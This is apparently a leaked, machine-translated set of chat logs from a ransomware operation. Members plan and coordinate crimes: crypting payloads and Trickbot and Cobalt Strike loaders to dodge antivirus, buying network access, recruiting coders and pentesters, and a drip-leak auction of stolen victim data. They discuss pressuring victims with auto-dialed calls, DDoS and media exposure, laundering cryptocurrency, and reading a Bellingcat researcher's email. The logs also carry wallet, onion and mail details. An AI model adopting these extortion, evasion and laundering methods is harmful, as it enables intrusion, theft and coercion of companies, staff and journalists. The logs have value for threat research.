who is responsible for this????
2
according to bk, I have some of the functionality for flashing gaskets, but one of the archives is broken, not all scripts are there to pick up online, tomorrow I\u2019ll take everything from the guys, I\u2019ll flash it myself and raise it, and in the future there will be no such problems

I don't know how to decrypt the signal
or are we current for loot and without political fuss

I'm sorry, I can't do anything here

So, are we really interested in such data?
I mean, are we patriots or what?)))
Of course we are patriots
I understand. if they decipher it there - I will beacon
and I also wrote there the other day to you about the auction, but as I understand it, you are still busy and did not delve into)
[21:21:02] <johnyboy77> in short, there is a person's mail from bellingcat\n[21:21:06] <johnyboy77> who specifically works in ru and yu direction\n[21:21:06] <johnyboy77> say so\n[21:21:08] <johnyboy77> and all his passwords are\n[21:21:17] <johnyboy77> and she's still valid\n[21:30:56] <mango> well, pull the correspondence, at least screen them\n[21:31:05] <mango> need specifics bro what to talk about\n[21:31:07] <johnyboy77> now download files\n[21:31:12] <johnyboy77> NAVALNI FSB\n[21:31:13] <johnyboy77> even this\n[21:31:18] <johnyboy77> right now

Is 60k a lot for carbon black?

I think yes, too much)
30 for the company for whom we buy and 30 for the carbon itself for 250 pc
this is the minimum face
my offline homies are ready to buy, I'm waiting for the go-ahead from S..
So
since you are in the spirit and talkative today - on you :-D
<mango> Salute bully! While I was sleeping, a very cool idea came to my mind about the data auction. I propose to open a site where 2-3 files of each non-paying company will be released to the public every 3 minutes, randomly. And you can delete the data of a particular company only by paying for them. The cost is determined by the number of remaining files * let's say 3 bucks per file. And then through the auction system. Let's say there is a fuss about some company - we sell to the one who makes the highest bid in the last 24-48 hours. I think so that they did not pay ok. It's one thing to restore the work of offices - another when for a month there is an open daily leak of fresh personal and work data. What do you think about this?
hello here?
:-$
I'm still working on auk)\nI'll show you soon what I've got
Yeah, okay) the point here is, in general, not just to roll out all the files at once, but for a little bit but for a long time

According to sonicols - what our researcher threw off to me - RESTORED, bushy. so they cost 1k. Sold only in US on eBay. I found new ones from a manufacturer in UK. They cost 2.5k pounds each. From YUSy to lead three weeks to Sevastopol to this dude at best, because due to covid there are big problems with delivery. From England, if you take new ones, it's faster. And there you can take a new model 410. Will be in Sevastopol in a week.

?
We appreciate the further reduction in price. Please realize that even at 2.5 million, we don't just have that kind of money at the ready to pay you. It's still very high. I have discussed with my management team here and the truth of the matter is that we don't need the decryptor but we are very interested in paying something to not have our data released. We are still just trying to figure out how much we can scrape together to offer. While we are doing that, my boss wanted me to ask you whether or not we will get access to our data that you took once we pay anything? We have understandably done some research and we have seen that in some cases, the data is given back to people once a payment has been made. We also noticed in the file tree that you sent over that some of the file paths look like they were from your local system. We would also like assurances that our data has been deleted from local systems as well
So this is the account.
Server status is different
Confused state and status. quarrel

we made a builder for a container and improved it. in the lnk container that launches the wb script, the script from the unallocated area of the disk collects the load from different sectors into a single whole and launches it :)
cool
must be used at least once
right now, we\u2019re making the panel on the web so that you can immediately download the load file, specify the parameters (number of different copies by hash, container name lnk name, additional files to the container) and build many different containers at once with different lnk hash to launch.
i made balzac and derek - they pull a couple of things, we talked with derek today - he is preparing wiring, the balzac broke down
Hello how are you
haven't heard from you for a long time
scolded cryptors for using qaz.im, they upload files there and set passwords with this service and make an archive. after that, the vatakat detection appears on all files. Now all files are transferred to 2 archives under passwords and on mega - so it seems that everything is ok with the files so far ..
the build machine for cryptors will be ready by the end of the month, yesterday they already started to run it in, but it\u2019s still damp

Hello, bro.
Are we doing 2 echels?
Hey
Let's
OK. I order everything.
Yesterday the second person filled 1494 bots. Good echel))
Well, why doesn't it work?
Apparently he doesn't quite know how to send.
Although he is also a very experienced person.
Or the wiring does not go
Balzac also does not go well
What are they doing wrong
letter may
Maybe.
?
And two to the same?
No, these are different.
Damn
And yesterday they did the same excel)
Who is the second one for?
1st cherry@q3mcco35auwcstmt.onion 2nd- netwalker@q3mcco35auwcstmt.onion
So, how do you pay for it?
Let's eat 6k for two for now. In 2 weeks. Is it possible so?
No problem
As I wanted)))
Okay. ))
2 weeks each)
yeah
How long will you drop?
I guess for an hour. Doing more
Understood
Sap has already cooked 2 eskels
Okay.

With tests, it would be nice, of course, to set up some kind of permanent test of the functionality by modules, I even roughly figured out how it all might look, but so far everything is at the stage of deploying a test environment, where a new coder is learning to raise the backend from scratch, not everything quickly

65 then for the salary, well, I can immediately get the salary)
baguette 2k will give the same norms?
just to clarify with him it's somehow not right. you are the boss here, you decide this) and he doesn\u2019t prescribe for himself .. or did you agree on something specific?
on vpnam - I gave the vpnov party to the reverse, he is silent for a while. the type does more, but waits for the reverse to say at least something. The Spaniard gives access to norms and Khors says the cases are excellent, we are working further with him
says 40 grids will give us
over there writes che)
\n[20:50:40] <wrdland> can you lock all my targets in 1 week?

how are you doing with lcoer?
Hey
Hello.
Glad you.
on volume 5-6 exchanges
top
So with the locker, everything is fine.
We are polishing it for new tasks.
Which were not in TK, sorry.
Because of this, I can not shift the focus to new projects.
According to TK, ABSOLUTELY everything is implemented.
Even AB can't handle it. Checked.
Hi how are you
how are you doing
You ask Brown, he is a tester. I can't praise myself. And he saw everything in battle ... :-)
It's not even that important. There we bypassed AB thanks to a completely idiotic assembly of the project.
So idiotic that AB doesn't react to it. At all
Hey
All laid out, all described.
you need 30 progers for booze
and 50 admins for reverse and horse
so how much do we give?
one?
Hey
Hey
where did you go??
do you work at all?
well give him 1.5
+
When will you answer my questions?
threw off 65k
you know what else you need
need 50 admins
25 horse and 25 reverse
hors@revers@
fuck it)
and 30 new progers for more booze.
yes he said.. will be done..
received the cue ball, went to distribute. answer the questions as best you can, at least in the morning, what are the modules needed for it
veron@ knock him, ask him when he starts
OK
Hello, We will start ?
Do you give me 3-4 days off?
Yes
take
Great, thank you
So I'm thinking now to insert the vnts into this wrapper.
Ay?
yes vnc inappropriately
Necessary.
Hello how are you?
))
Forgive me for objecting, but the same Sandy does not get off this topic.
He really wants a new, even more effective release.
And I have it!!!!!!!!!
Zadolbal, of course, but not to throw it in the trash, right?
I mean VNC, not Sandy.
:-)
Although, if you think about it...
No, Sandy is good.
Let's move on to more pleasant questions.
Prize!
Prize?
Yes, PRIZE!!!
Ay?
Here you go...

Understood. Everyone apologized to each other. My fault, I want to show you more results. we sit without targs. And while everyone is busy sorting and unloading, they asked the chela just to check, and it turns out he gave them. Funny. But the bottom line is that no one wanted to deceive anyone, this is a fact. Never again will this happen. I will not take more than the hands of the targets. I will not jump above my head.

Hey
duck with logs, I wrote you about the topic with a stick many times, balzac made bots, I poured a stick and something else while the stick handler drank or disappeared for weeks, then there was a long break, the handler disappeared, then it stopped pouring, now everything worked again, but Balzac disappeared somewhere and you cut off access to everything
and in general from what I can work out
I can pour a stick and throw you half of all the work

Damn, now I'm going to worry) I, as usual, hastened to congratulate everyone on the upcoming ones, issued a salary to quickly dump it on the weekend, too, and eventually screwed up again :-D
let him throw off a report for two months what he did just do
from nothing there is nothing

1. Salamander wrote everything off, I'm waiting for reports from him.\n\n2. Signed off with Veron - he has troubles with the dock so far. I promised to help him over the holidays, either we\u2019ll make a dock for him, or the second option is a container. I gave him a presentation, described everything how it works and what he can do, I\u2019m waiting to see how. At the start, he will say during the holidays - he is waiting for the issue with the dock / delivery of the payload to be resolved.\n\n3. You still haven't answered what config is needed for installs. Let me remind you that we decided to give the version of Trick2 for it (which was originally planned for Target) for Veron - which modules should be in the troy config, and which ones can be removed so as not to fire extra modules and reduce the weight / detections of exe. If I understand the software device correctly, I need an injector, pvgrab, importdll. What other modules are vital in the config?\n\n4. Contacted Hors about admins - he clarified the task, He says we need pentesters rather than admins. And at 6 in the morning, a great idea came to my beautiful and drunk head where to get them :) Do you remember the revils were promoted for damage - they threw lam bucks in cue balls on a deposit and then they started to break the topic - they wrote there that they were inviting teams of hackers / pentesters to work with them. They wrote 5 pages of the topic with suggestions! They write something like that. \"Team 3 people experience, etc\" and there are a lot of them 5 or more even pages! That's where we'll take them! I will spam personals with a job offer for them all + many people left contacts there themselves (although everyone has toxins). By the 10th it will be done. The only question is how to pay them. How much do we pay? 2k - how is everyone?\n\nAnd the salary for me if possible)) bc1qclzlkq8j3ckmulye0k5xpzfymsxxha735mlauf
And here's another. I suggest for Verona to always prepare 2 files at once for 2 groups. So that in case the file gets tired quickly (and this is not uncommon for us + its volumes) - we always had a ready-made encrypted second file in order to avoid downtime and waiting for cryptors. I think it will be a good move, I just remember the times when I myself lil - our main problem was to get the file by 10 am (and he is an early bird and does not tolerate delay) and the second moment is the replacement of crypts - before it could last for 2 hours. And with such a maneuver, we are well reinsured.

before that I used this mail andrej.sergeev_2020@mail.ru maugli765 but it was sent to spam

in addition to this, we need ordinary progers

ordinary progers of which there are already many
they still need 30 people

by trick, you only need networkDll, pwgrab and reproduction modules that are loaded later and that's it
> pay? 2k - how is everyone?\n\nno, they will be on a percentage
veron is now the most important person
he gets all the attention

Yes. Right now I'll clarify about the wallet
Damn, you were a little late - there the type I have is ready to pay all sorts of things, but you weren\u2019t there to clarify the wallet - and I regul a new one. I threw off my purse - we are waiting.
I will then give you a password and recovery words from this wallet so that you don\u2019t drive extra commissions
Kosh the same for payment?
clarified

Hey
how are you
Hey
Hey
there mango writes about vpnov
hey bro!
with all holidays you!
I don\u2019t know what to write to Armata without you.
[Error: The message is encrypted and cannot be decrypted.]
Hey
urgently needed
just cancel your vacation
needed every day
data entry problems
and the schedule is needed so that you are up to 23 o'clock to any
because people start working actively when you are gone
you can leave later but before 23 and better before 00 should be
he was in the afternoon. took hls for today. Wrote him no reply. afk apparently.
do you have bots?
knock armate
he has our deposit there, it seems, in Germany lay
remember?
Sent
I see, thanks)
knock Knock
Hello, plz do logging of all errors if the client fails for some reason to create a chat when loading .txt
Hi ok
\n[22:16:21] <love> Okay, tomorrow already then. After the accesses were taken away, now the bots do not go to the admin panel, we are still dealing with this
deal with it
urgently
Hey
how are you ?
Hey
let's modify the trick, remove the excess
there, in fact, the logpost admin panel, etc., is no longer necessary for us
what to remove?
and a bunch of extra functionality
the main thing is cleanliness and quick release
and performance on each
what does logpost mean?
some ideas maybe
logpost is an injectDlll module
to browsers which
understood
but it does not seem to be loaded for a long time
well, like yes
maybe there is something else
here we have a caliper love@
Yes I know
he says that the bots don\u2019t knock, and if they knock, then it\u2019s difficult to bring them to cobalt
just do not one does not tap
I mean, cobalt doesn't start from a trick?
> And there is a grid that we did and did not start yes chat?\n\nit is necessary to clarify with the horse, I do not take reports from him. Only upon payment
let's pay for spam and add it here and armata too
on armata you need to test it
on 20-30 bots maybe
how will the backlash be?
what should he throw now and for what?
what if there is no backlash
at all
I heard that on the software class it does not knock 20% only
need to test
at least a couple of times
well there is pws
command
and how do you run cobalts on a trike?
and this command does not work with trika?
z yt pyf.
I do not know
love texts me
maybe he's dumb
Hey

At 5 in the morning he was blown up) all the data was given to him, he is already engaged. I told them this: we need to clarify the situation with all the latest news, find out who her lawyer is and what claims go to her, and so on, in general, for now, intelligence will try to get all the official papers that we have, and we will continue to think. We will try to make a victim out of her, got a job on the Internet, what she did and with whom she worked, she didn\u2019t know, if the guys don\u2019t let us down, we\u2019ll pull her out or get the minimum possible.

Hi, it turned out right now to make a HeadHunter acc, I bought a IP dock, made an acc, confirmed it, right now it will be much better to look for people, you can send as many announcements, and not where you took it initially, you could send only 50 a day. So now it will go quickly, all the same, no matter what anyone says on the XX, but there are more people on it. Well, since Mon, I wrote that 3 people should go out as sysadmins. So by the end of the month I will find 50 people, how many of me are required.

mixer and any exchanger, but it is better to change it to the cache or to the left plastic
plastic
did the recruiter tell you what we do?
Well, about that I understood yes, but just a mixer is some kind of service site)?
yeah
look for something darknet
let's go in more detail
so that there are no misunderstandings
Well, if I choose a cache type through an exchanger, cash replenishment on a card, is that normal?
Yes
fine
then ok
many directions
heard anything about ransomware?
nope
ransomware?
lockers

Hey
I received such a letter in response to the task, I think it\u2019s necessary to discuss our actions somehow so as not to pay the same person for the same task several times. I didn\u2019t tell him about bit kosh:\nI chose the first task that came across about obfuscation of strings.\nPrepared the project in VisualStudio 2019 below.\nIf necessary, I can send an archive with a .sln solution.\n\nYou can simply copy the text into a typical VS2019 \"\"hello world\" console project.\nCompile and get what I tested - the presence of lines in the program,\ntheir absence in the binary file (checked by hex editor), or in terms of a convenient\nIDA PRO software.\nIf the task is completed in accordance with your task and your ideas\nabout the right decision, please transfer the promised fee to\n\n\nbc1qkfuf2cd87w2u2frrlgatuhvuwj6clr8zyxlrum

I didn\u2019t tell him about bit kosh:\nI chose the first task that came across about obfuscation of strings.\nPrepared the project in VisualStudio 2019 below.\nIf necessary, I can send an archive with a .sln solution.\n\nYou can simply copy the text into a typical VS2019 \"\"hello world\" console project.\nCompile and get what I tested - the presence of lines in the program,\ntheir absence in the binary file (checked by hex editor), or in terms of a convenient\nIDA PRO software.\nIf the task is completed in accordance with your task and your ideas\nabout the right decision, please transfer the promised fee to\n\n\nbc1qkfuf2cd87w2u2frrlgatuhvuwj6clr8zyxlrum

Hello. in place?
messages reach?
see how there is a theme, so that there are always targets. stupid to buy. people under % are not willing to give. there are bruters, owners of stealers, etc., and it\u2019s easier for them to get a fix for their access. targets with a roar of 100kk cost about 3k+$. etc. it depends on the network of course. I suggest buying anything and everything. at my partner, are familiar so does. I received 5kk in monthly payments. found suppliers and buys everything. spends decently, but of course the exhaust is incommensurable with what it spends. In general, I offer to buy everything that comes to hand. traff, accesses (sitrix, vpny) ... we are moving on spam, I hope we will win anyway. but do not sit on the same ass exactly.

For new people, too, it is not clear anything. As I understand it, you need to end up with 50 admins for the horse, 50 for the reverse and 100 encoders for the booze in total?

hi lead everything in different reports
I'm waiting for specifics from you
hello bro
Hey
Hey
5 min plz go home
1. Alka is transported from Florida to Ohai, she has a state lawyer because she doesn\u2019t have money for her, as I understand it. We can get documents if our lawyer concludes an agreement with her for defense and will represent her. In order for him to start acting, you need to charge him 10k. And we need to think about how it is safe for him to send them to the US .. How and what's next for now xs, everything is suspended there. Waiting for an answer
So in the end, I understood everything correctly from new people? 50 reverse with professional, 50 horse and up to 100 encoders by the end of summer for booza?
Yes
everything is right
and still need a man 5-10 ali
ali@
admins too
we have hr managers these are salaman, kagas and viper
they also deal with this
apart from your search
keep them under control
and by salary
too
Yes, I understand, the viper wrote to me. I will do everything
there still need 10 people reversers for swift@
keep them under control too.
and at the same time look for alternatives
by ooh
you decided to collect an army chtoli :)
you write me wrong
10k for what?
what conditions
terms
What if she refuses
for the lawyer to start work and conclude an agreement with her
\n[16:53:40] <balzak> in general, bots are coming)\n[16:53:51] <balzak> there def is conjuring something, otherwise they are not displayed in the admin
you're here?
what's going on there?
because without this agreement he can do nothing
loot is not needed right now
right now, you just need to give an answer - dada, no no ..
yes ok
do
I think they bought carbon, they called back half an hour ago, I'll tell you the details in the evening)
http://epyclq65gskclmpu.onion:1337 - our file cleaner. will be on the SIA blockchain
super
but booze didn\u2019t appreciate this ..
what did you answer
I wrote to him everything that we then discussed with you on file storage, notes, and so on in the blockchain. he began to boil that there were no people or resources for this, that this was all pampering, etc.) in the end, it was all done to me by one of our admins, benny in the rocket. Now we are testing and thinking about the functionality)
\n[16:57:25] <balzak> at the moment I'm sending, according to the status there are already 50 bots, I'm sending for about 40 minutes, but for some reason it doesn't reach the red admin panel, def understands\n[16:57:39] <balzak> here, in principle, all the information
here?
pliz take over completely the trick and all the problems
ideally, everything should be the same as on qaz.im but without logs, plus access to files and services using a personal password
I will still pay more, but so that you alone are responsible for everything and contact everyone inside the jabber
so that everything taps out everywhere
if necessary, we will remake the admin
because the song continues with the fact that cryptors and testers periodically merge files to all sorts of shit services ..
Do we give salary on Monday? or Friday?

Hi Yes
Hey
and what's in there
there are no new bots
yes, this thread is dead
Hey
I only need a stick - online and that's it, but did your topic die or did I not understand?
balzac would make bots
yeah great
Hey
I wanted to dig into live material, under what conditions do I have such an opportunity?
Hey
if you ship bots
then pick
yes, balzac doesn\u2019t work either now
if it works out
then take his bots
share it among yourselves
I need nothing
zero opportunities in this matter, I spent a couple of months studying - to no avail
in general, I\u2019m pointwise there on bots and only collect information
i.e. with regard to kill some account no
I collect information on the company only
by accessing accounts
i.e. harm - well, just zero
this is not amazon
or some other tricks
found the right link - went in, collected information - left, and never returned
for offline work
I can drop some amount right away if the question is about finances
I tried to search in public - there, of course, there is simply ZERO biz bots. so I can't fish there.
?
Listen, I'm trying to understand here, according to the blacklist there is a table. But on the white sheet I can\u2019t understand where to enter the IP

Do you have the opportunity to get a lawyer in the US?

e vtyz ytne
I do not have
Hey
sucks
look at the alka what the hell.. she's not an immigrant, she has all the relatives there, citizenship, and so on. there are 50 cases on it - episodes according to ours. passes like a Russian hacker, the case will most likely be political
they gave me a lawyer, they said the best, plus excellent connections, he knows the investigator, he knows the judge, he is a federal lawyer there, licensed, etc., etc. he got acquainted with the case, he says tin there, of course, but you can come up with something, for a start you need to get the minimum amount, and there you can already stay there before you get out, you won\u2019t be able to sit down
she is now shining from 30 years to pzh
go nuts
well, you gotta help her.
and further
The case will last a year or two at best. he says the whole process will be 150,200k, it can be done in two parts.
gotta get it all
in short, you need to break through it, I can give all its data
Yes, it's expensive, it makes no sense to break through
he will be able to get the case only if he leads her
need to find a good lawyer
second point - we need a person who would generally conclude an agreement is
well they are relatives
what does sane mean? pay him a month?
here they do everything in white, a contract from their law firm, and so on and so forth. and this is for the whole process, in any scenario it will come out no less
I can give his data - you yourself go there, well, either punch him - well, that's all I can do
step by step
first you need to get the whole thing
it's only if he's her lawyer
no one will give him anything
not the fact that only
gotta get through someone else
it\u2019s a dashing thing there, when they started to find out - they said that the FBI was conducting the case under very strict control, they had been looking for a week for a person who would subscribe to this at all
let's do it. try to punch through someone else. try to get through a lawyer that I will give, and you need to make a decision at least within a month
I will try to talk in order to pay in installments, but they assure that everything is in white according to the contract, they have a license and everything..
I\u2019m waiting for an answer in general then, I\u2019m holding them in my bosom
drove a couple of people for the horse, a couple of admins more .. I'm trying to fight with the cryptors, but so far it's hard for us with the vatakat, an incomprehensible detection ..
what other tasks are there if you write
in terms of salary, everything is clear - I distributed everything to everyone, I managed before the failure of the cue ball, it\u2019s true that there is not enough left about 1k, and that one will be taken away tomorrow
https://ibb.co/jVpZngt\n\nthere is a photo - the contacts of this lawyer. it was given by serious guys too, I am sure of it, because I know people who recommended it. If you find better - I'm all for it. But that's all I can do for now.
I haven\u2019t forgotten yet, there people who give access - wrote that he had problems with his bot, asked if it was possible to rent software from us and under what conditions?

Hello, please make mon308.dll, mon309.dll
Yes, I already want to start and try my hand at a new project
yeah you said in asterisk you rummage
we need to make an auto call
for targets from different numbers, what do you need to buy for this?
Hey
yes experience has work and settings.
auto-dialing through the directory
Yes
we will deliver reference books just there numbers
you need a virtual server to install an asterisk, the phone number from which the call will be made
phone numbers will change
it is necessary, as far as I understand, to buy sips
I just did not come across asterisk
what numbers will be city which will be changed
depending on how many numbers will be changed
needed to change
and the numbers need American what thread
or European
ideally buy them for a cue ball
well, if that they just drive
from the left plastic
How often will outgoing numbers change?
a xs
let's think about it
then here's what you need to understand
How often will outgoing numbers change?
I will find out how to get European or American plates
I need a virtual cloud resource where Asterix will be located, if there is no such resource, I can also analyze this market
purpose of the call? understand live number or not?
no caller ransom demand and fuck these top managers
sometimes they are silent
I understand it means just automatic dialing
they need to be encouraged
is there a resource for deploying a telephone server, a virtual server?
of course there is
I will give a server
ok, then I will collect information on cost and purchase phone numbers
for the cue ball
yeah great
well, then you need to understand that the numbers will be blacklisted., I'll think about how this can be tracked so that the numbers in spam will not be used in the future
yeah ok
how often auto-dial will occur every day or another algorithm
how many calls should autodial top managers
for example
2 calls during the day from different numbers and so on for a week.
or some other algorithm
Hey Ya
Yes it goes
Will be ready by the end
eleven

ok i will figure out how to do it
ok, then I will look for information on how to purchase rooms and their cost
yeah ok

With Khors, we are also procrastinating on the topic of ransoms, as I understand it, everyone is very reluctant to pay, you need to push harder .. Limiting the time frame xs of course how, 2 weeks is quite acceptable, as many take loans, etc. .. I think that we need to analyze and nightmare more deeply by merging something that is dear to them, and not everything in a row, plus we need to push harder, annoy with calls, ddos partners, cover it in the media .. I propose to organize the work in such a way that by the time of the lock we have a complete analysis report: top management, contacts, their personal data, what we will find, partners, their contacts, and most importantly, a strategy is calculated on how to press, what is acceptable for what targets. We wrinkle boobs, bargain like schoolchildren, gangsters don\u2019t behave like that, all these concessions are useless, I didn\u2019t expect this from you even somehow :-D We just need to set ransoms more realistically from the beginning and stand firm. And we start with a lyama and agree to 100k. Taking into account the fact that the FBI sits everywhere monitoring all these negotiations, I think they are mocking us. It\u2019s not just that they drag out all these negotiations, they study us, wallets, etc. Maybe a big leak is some kind of loud or something else that will attract attention, it can even make locks and drains without ransoms at all - an exemplary flogging supposedly) Throw 30 50 100 companies there - throw out all the data we can get .. maybe not even large ones, but so that it was heard, so that everyone else would tense up and think less .. And change the color of the admin panel, we are a locker, not tiffany :-D
[20:21:06] <mango> hss answered - will consider
vvh neighing from our proposal .. well, in general, for the better, you don\u2019t need it, it\u2019s a dump)

Hello, throw 500$ on servers\nto this address\n1G5wLGHbsMmbRT7CdfmBA4aeR7RNwiG8FY\n\n\nLooked at the site with the imitation of attachments?
In short, I brought a chela into our rocket who will form the intelligence and blackmail department :) but we kind of invent it out of thin air, we would understand where to start, and so on. Maybe you have some methodologies being developed there?))) or at least poke what to study .. while I gave the task to buy zuminfo and rocketry accounts, I threw a few links to the buzz, I asked the hackers, they say, if you have any experience in these matters - share, for now silence...

let him send 12500 and I'll give cue balls)))
I need to wash 12500 in yus too ..
I don\u2019t need cue balls) you can\u2019t spread them on bread
we will send you a lope on the card through the money changer)
Well, yes ... and then what about the 30% commission?
do you have a ru card? I have money changers who will throw a card on ru, but I need to pay 12.5k to the US lawyer. Can't your people help us there?
and we will send it to him if necessary, or you, as you agree there yourself)
and I can send you a map
well, he can throw it where necessary .. but I don\u2019t know how it\u2019s done there .. 12k of course not)
hasn't accumulated that much debt yet
are you not in the usa?
I understand) then these will be different operations, I'm just busy looking for who would change the grandmother from yus to btc
me not)
if I find the guys, I'll beacon you, maybe they will stir up you
the main thing is that without cheating
but you can\u2019t create links for a payment order .. so that he just pays .. and you would lose BTS?
no bro i didn't see that
it\u2019s hard to drive money into yus
well, then my people can pay which thread to the person on the account in yus .. by direct transfer. the main thing is to make it clear that my people paid. and yours is accepted.
mine will definitely accept white, this is a normal person .. ask if he suddenly needs cue balls, I would send him 12.5))
I didn\u2019t understand) if he needs cue balls .. then how can your 12.5k be? ) it's not beats
and you mean cue ball at 12.5k?
let's deal with my 5500 first? what should I tell him?
Yes
tell him that drive us not 5500 but 12500))))
he won't understand)
and we will compensate him with cue balls for the rest
and we will send you on the map
then wait a couple of days
okie. but I will write to him
I will find the guys who will accept in yus - I will ask at your request
does it burn for you?
until Wednesday, plus or minus suffers?
while he endures .. people owe me a year and a half. my current service for him fell below the plinth).
I wrote to him:\ni have one solution about 5500$ payment. I have man who should pay $12500 to some lawer from USA. So it could be an offsetting.\nAlso if you need bitcoins, this man can pay you bitcoins and you pay to this lawer the rest of the amount. What do you think? Is it working for you?
norms?
yes normal
well, OK . then I expect something from you and from him, too, a reaction ..\nbut the last thing I heard from him is that he is not interested in cue balls .. maybe something has changed now

Hello. Support for documents with macros, uploader, admin panel for uploader. Tasks - cleaning from detections.
Hello. Everything is fine. I'm setting up servers. At this stage, I raise the virtualization server for Mac OS.
At the request of Buza, I dealt with pupy
yeah
C++ needs more people and reverses for swift
That's probably all my current tasks. :)
Hey
what task is this
OK got it
For more organization, but due to the peculiarities of production, I think this is not realistic. :)
Hey
is it possible to clean?
someone uses your dock
I want to do rtf to add load
While it turns out

what about pupy?
Hey
how are you
can you make bots?
I was just taken to the team to the defender and set this task.
Launched, looked, as a whole works. But everything is very unstable, the bot's failure does not always reach, many modules do not work at all, they just dump python dumps. There is no web. It's so easy to take and start using it is not realistic.
Hello. I do loader/bot builds every day. I read them periodically. I update/change them from time to time. When I'm not doing BC, I'm working on finalizing my crypt so that it can be used on the server for automatic builds.
Hello. Things are normal. To Twin in Team_C was determined. We are going to jump into the new grid
Able to generate bots for different platforms, withered linux, android. Watched only under Win
Hello, everyone is fire, we are looking for the last 2 large cases, we are waiting for bidding ... well, there are also other cases in the work, along the way I try to train Newcomers in the team, we added tasks, we made our team, we will follow up to train well and do incidental things. issuance of servers to newcomers, etc. .. it\u2019s impossible to describe everything at once))
Everything is well. Interesting and rich.\nAll cryptors have moved from manual labor to automatic assembly through a build machine.\nNow they are engaged in updating and cleaning stubs. And I make files on the build machine, check and issue. If something is being built dirty, I turn to\ncryptor. He cleans the stub. Check again and release.\nTasks:\n1. Encrypting files for Leo on the build machine.\n2. Silkcode cobalt\n3. Lockers\n4. Cobalt exe and dll\n5. dll trika\n6. Teaching and giving access to other team members to the build machine so that they can collect crypts themselves.\n7. Preparing links for loading and testing emails for netwalker, hash, cherry.
dedik and server with msf waiting for a long time
Hello. All fine.\nI understand crypto exchanges, protocols, api, etc.\nThe task of developing a crypto exchange.\nAccording to VNC, I deal with the bug of the module falling when trying to decrypt passwords.
Hi, I\u2019m working like everything is working out, I learned a lot of new things from you here, and I\u2019ll find out ... the guys always show something new, in general, everything works out
Hey, I'm moving slowly.\nI work with bot admins and know how to set them up, so far I've set up import and black.\nI'm now getting to grips with the supervisor and documenting it.\nThe task is to set up a test server and make an ngetwork column from one admin area to another\nIn general, there is a tasklist, there is a lot of things\nThere is a task to make a type of stats according to what data and where they came, where they went

And so everything is fine, everything you need is provided, :) thanks.
Hi how are you doing
Hey! I'm working on improvements to the bot and loader. There is a x64 version, working, on which there is 1 detection on a non-primary AB. There is an x86 version, it has more AB detections, it needs to be cleaned. Now I'm screwing proto2 into the bot and loader. The next task is to clean the x86 version of detections. Before that, I made a loader in dll format to run through rundll32. There were difficulties, but they were solved. dll-loader works both by itself and as part of crypts
Hey

Hey
They let Elon's mailbot test, it turned out that loading it through bots is not an option, as Elon himself says there are subtleties and for some reason the load does not work. Defender loaded, but they (mailbots) did not fly to the admin panel, Elon is finishing up like a new module or something so that the mailbot can be loaded through bots)

Hello, you're doing well.\nI apologize for not answering right away, I haven\u2019t communicated through a toad for a long time, I didn\u2019t see what you wrote.\nNow I am finishing a full report on the mechanism of operation of the Intel ME controller and the AMT technology based on it.\nRestored a bunch of undocumented commands with the help of reverse, interaction interface dump and fuzzing.\nUnfortunately, the starting theory based on the presentation of the Embedi/PositiveTechnologies researchers was not confirmed in the form in which they presented it, but there is another legal mechanism to activate AMT, but so far it has not reached a working POK, at the moment I am making a buffer sniffer that provides the HECI interface, because this is all configured in UEFI, then the sniffer took a little longer, after I completely restore the command set, the POK will be prepared.\nThere are ideas, if we talk about ufi, then this is not just a load dropper, but also possibly some kind of daemon of the SMM level of handlers, plus. Now I have closely studied the ME controller, then there are ideas to test such functionality as rewriting an SPI flash drive through it. Usually this controller is allowed to write to a flash drive, which cannot be said about the processor, and some commands have been discovered that are responsible for this functionality.

I overclocked yesterday, fantasized fun functions, supposedly personal file storage, with the ability to share individual files, closed clubs of interest, entry into which would be considered by voting, open public groups for general discussion .. User reputation system to throw and intermediaries to eradicate and leave only really working guys .. You can also tie a bunch of services here, like the grandmothers did last week, when they gave the opportunity to spread the date to all hackers on their resources, even if they themselves and have nothing to do with their locker - any can put any date there for storage ..\n\nHere, under this social network, you can realize all your erotic fantasies in one place, both the exchange and file storage in the blockchain ..\nThe works are gigantic volumes, without the experience of administration we ourselves will not pull, I think that we need to attract some kind of colleagues, like xss .. this will be the evolution of our underground into something more serious ..\n\nUncles, think it all over, please, the topic is interesting, but very difficult. US..

pliz tell me how to use these filters, def only dealt with ip
will go?
looks like this is how to deal with it
and what is not clear?
my client ate some symbols
there is a full description in the turnip
you can right examples exactly according to TK
1) by ip (you can specify specific ip, or a whole range)\n2) by id:\n Kevin_W617601* - all bots whose id starts with Kevin_W617601\n *Kevin* - all bots containing Kevin in id\n you can specify a list of such filters\n3) By Version:\n       Version < 1080\n       version == 1027\n       Version != 1089\n       Version > 1099\n4) by Group:\n      aver*\n5) by System:\n      Microsoft Windows 10 Pro\n      Microsoft Windows 7 Professional\n      Microsoft*\n      *Microsoft*
#\n  <<\"x\">> => 1,\n  <<\"y\">> => <<\"hello\">>,\n  <<\"ip\">> =>  ip, <<\"162.76.2.1\">> ,\n  <<\"true\">> => true\n
then:\n\n* 1 > 2 -> false\n* x =< 2 -> true\n* 1 ++ 2 = 12 -> true\n* x ++ 2 = 12 -> true\n* x ++ 2 = 2 ++ x -> false\n* x ++ 1 = 1 ++ x -> true\n*y = \"*lo\" -> true\n* y = \"*lo*\" -> true\n* y = \"lo*\" -> false\n* !(x>1)&y=\\\"hello\\\" -> true\n* y =& [ \"*lo\", \"hel*\"] -> true\n* y =|[ \\\"lo*\\\", \\\"(hel*\\\"] -> false\n* ip ~ \\\"162.76.0.0/16\\\" -> true\n* ip !~ \\\"161.76.0.0/16\\\" -> true
here are all the examples
those. each client is some properties .. see above ..
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have
still not clear
and you can define the rules .. if the rule is true, then it is a good client, if it is false, then it is a bot. If at least one of the applied rules is false, then the client is rejected
well, read it first
what do not you understand ) ?
pliz make a few examples specifically for TK
e.g. Kevin_W617601* - all bots whose id starts with Kevin_W617601
how to write it in your version?
id != \"Kevin_W617601*\
<<\"true\">> => true,\n<<\"false\">> => false,\n<<\"id\">> => Client#client.client_id,\n<<\"client_ver\">> => Client#client.client_ver,\n<<\"name\">> => Client#client.name,\n<<\"group\">> => Client#client.group,\n<<\"ip\">> => Client#client.ip_parsed,\n<<\"country\">> => Client#client.country,\n<<\"sys_ver\">> => Client#client.sys_ver,\n<<\"importance\">> => Client#client.importance,\n<<\"userdefined\">> => Client#client.userdefined\n\nhere are the available column IDs
so you need to write <<\"id\">> != \"Kevin_W617601*\
?
